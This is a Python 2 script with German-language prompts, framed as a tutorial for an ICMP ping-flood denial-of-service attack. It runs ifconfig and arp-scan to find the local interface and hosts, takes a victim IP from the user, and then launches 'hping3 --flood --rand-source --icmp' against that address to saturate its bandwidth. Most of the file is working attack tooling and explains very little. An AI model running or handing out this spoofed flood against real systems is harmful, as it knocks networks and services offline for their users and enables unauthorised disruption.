#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen

def ICMP_MENU():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: ICMP/Ping Flooding' + shellCols.ENDC +'\n'
		print('In diesem Tutorial wollen wir einen Denial of Service realisieren, indem die zu verarbeitbare Bandbreite gesättigt wird und somit "echte" Pakete nicht über die Leitung geschickt werden können.\n Um dieses Tutorial durchzuführen müssen wir zuerst unser Netzwerkinterface und die IP Adresse unseres Opfers herausfinden.')
		
		command = rlinput('Zuerst das verwendete Netzwerkinterface herausfinden mit: \n# ', 'ifconfig')
		os.system(command)
		interface = raw_input("Verwendetes Netzwerkinterface eingeben: ")
		interface = interface.strip()

		command = rlinput('IP-Adressen im lokalen Netz herausfinden: \n# ', 'arp-scan --interface ' + interface + ' --localnet')
		execute(command)
		ip_adress = raw_input("IP-Adresse eingeben: ")
		ip_adress = ip_adress.strip()


		#START FLOOD
		
		print("Jetzt erst beginnt der tatsächliche Angriff.\nDer Angriff kann jederzeit mit CTRL+C abgebrochen werden.")
		
		command = rlinput('Starten des Ping-Floodings mit: \n# ', 'hping3 --flood --rand-source --icmp ' + ip_adress )
		execute(command)
		
		

		print('Nun soll die Bandbreite des Netzes ausgelastet sein und die Verbindung mit z.B. einer Webseite nicht mehr möglich sein.\n')
		print('Ende des ICMP/Ping-Flood-Tutorials erreicht! \n Bitte eine Option zum Fortfahren wählen: \n')
		print ('1. Zurück zum Menü \n'
			+ '2. Zurück zum Start des Tutorials\n' 
			+ '0. Tutorial beenden \n')
		selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
		else: 
			attack = False
			return False

